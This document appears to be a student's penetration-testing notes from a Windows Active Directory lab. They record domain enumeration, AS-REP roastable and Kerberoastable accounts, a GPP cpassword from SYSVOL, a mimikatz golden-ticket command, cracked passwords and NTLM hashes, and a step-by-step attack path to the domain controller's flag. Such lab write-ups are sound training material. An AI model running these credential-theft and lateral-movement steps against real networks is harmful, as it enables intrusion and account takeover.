# Host
```
hostname: web04
IP: 192.168.201.72
```

## Local Admins
```
Get-LocalGroupMember administrators

ObjectClass Name                PrincipalSource
----------- ----                ---------------
Group       CORP\Domain Admins  ActiveDirectory
User        CORP\iis_service    ActiveDirectory
User        CORP\jen            ActiveDirectory
User        WEB04\Administrator Local
```

## Sessions
```cmd
qwinsata

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
 console                                     1  Conn
>rdp-tcp#0         pete                      2  Active
 rdp-tcp                                 65536  Listen
```

# Domain
```
net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          42
Minimum password length:                              7
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.
```

# User
```
whoami /all

User Name SID
========= =============================================
corp\pete S-1-5-21-1987370270-658905905-1781884369-1123


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
CORP\Development Department                Group            S-1-5-21-1987370270-658905905-1781884369-1127 Mandatory group, Enabled by default, Enabled group
CORP\Sales Department                      Group            S-1-5-21-1987370270-658905905-1781884369-1125 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```powershell
$users=Get-DomainUser
$groups=Get-DomainGroup
$comps=Get-DomainComputer
$acls=Get-ObjectAcl
$shares=Find-DomainShare -CheckShareAccess
$locads=Find-LocalAdminAccess
$npuser=Get-DomainUser -PreauthNotRequired
$krbr=Get-NetUser -SPN
```

## Domain
```
Forest                  : corp.com
DomainControllers       : {DC1.corp.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : DC1.corp.com
RidRoleOwner            : DC1.corp.com
InfrastructureRoleOwner : DC1.corp.com
Name                    : corp.com
```

## local admin computers
```powershell
Find-LocalAdminAcess

#nothing found
```
## Shares
```
 $shares
Name           Type Remark              ComputerName
----           ---- ------              ------------
NETLOGON          0 Logon server share  DC1.corp.com
SYSVOL            0 Logon server share  DC1.corp.com
ADMIN$   2147483648 Remote Admin        web04.corp.com
C$       2147483648 Default share       web04.corp.com
Users             0                     FILES04.corp.com
```
## User No-Preauth Required
AS-REP roastable
```

PS C:\> $npuser | select cn
dave
mike
```
## USER Kerberoastable
```
PS C:\> $krbr | select cn
krbtgt
iis_service
```

## USERS
```
Administrator            dave                     Guest
iis_service              jeff                     jeffadmin
jen                      krbtgt                   maria
mike                     pete                     stephanie
```
## USER: pete
```
logoncount            : 31
badpasswordtime       : 10/21/2022 10:40:45 AM
distinguishedname     : CN=pete,CN=Users,DC=corp,DC=com
objectclass           : {top, person, organizationalPerson, user}
lastlogontimestamp    : 1/7/2024 2:36:27 AM
name                  : pete
objectsid             : S-1-5-21-1987370270-658905905-1781884369-1123
samaccountname        : pete
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 1/7/2024 7:36:27 AM
instancetype          : 4
usncreated            : 24766
objectguid            : aec21c0d-6b0e-4ead-ad9b-c2fe45c4650e
lastlogoff            : 12/31/1600 7:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=com
dscorepropagationdata : {9/6/2022 7:39:49 PM, 1/1/1601 12:00:00 AM}
memberof              : {CN=Development Department,DC=corp,DC=com, CN=Sales Department,DC=corp,DC=com}
lastlogon             : 1/7/2024 3:00:33 AM
badpwdcount           : 0
cn                    : pete
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 9/6/2022 7:39:48 PM
primarygroupid        : 513
pwdlastset            : 9/6/2022 2:41:54 PM
usnchanged            : 544975
```

## Domain GROUPS
```
Administrators
	jeffadmin
	Domain Admins
		maria, jeffadmin
	Enterprise Admins
	Administrator

Sales Department
	pete, stephanie
	Development Department
		pete, dave
		Management Department
	
```

## Files
- `\\dc1\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml`
```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups   clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User   clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
          name="Administrator (built-in)"
          image="2"
          changed="2012-05-03 11:45:20"
          uid="{253F4D90-150A-4EFB-BCC8-6E894A9105F7}">
    <Properties
          action="U"
          newName=""
          fullName="admin"
          description="Change local admin"
          cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
          changeLogon="0"
          noChange="0"
          neverExpires="0"
          acctDisabled="0"
          userName="Administrator (built-in)"
          expires="2016-02-10" />
  </User>
</Groups>
```

- `c:\users\pete\command.txt`
```
PS C:\users> gc .\pete\command.txt
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369-1105 /domain:corp.com /ptt /target:client75.corp.com /service:cifs /rc4:b57715dcb5b529f212a9a4effd03aaf6 /user:jeffadmin
```
## Credentials
### Passwords
```
administrator:P@$$w0rd
```

- `web04`: `Impacket-GetNPUsers`
```
mike:Darkness1099!      <---- 
```

- `client75`: `mimikatz sekurlsa::logonpasswords`
```
maria:2a944a58d4ffa77137b2c587e6ed7626:passwordt_1415 
dave:08d7a47a6f9f66b97b1bae4178747494
```

### Hashes
```
jeffadmin:b57715dcb5b529f212a9a4effd03aaf6
```

## pete outbound user permissions
None found



# Attack path
1. `impacket-GetNPUsers` on `web04`
	- get `mike`'s hash and crack with `hashcat`
2. Find out which machine it has rdp or smb access using `crackmapexec`
	- rdp to `client75`
3. Mike is local admin on `client75`
	- `mimikatz`: `sekurlsa::logonpasswords`
		- get `maria`'s hash and crack with `hashcat`
4. Find out if maria has smb or rdp access to `DC1`
	-  `maria` has smb access to `DC1`
	- get the flag from `c:\users\administrator\desktop\flag.txt`
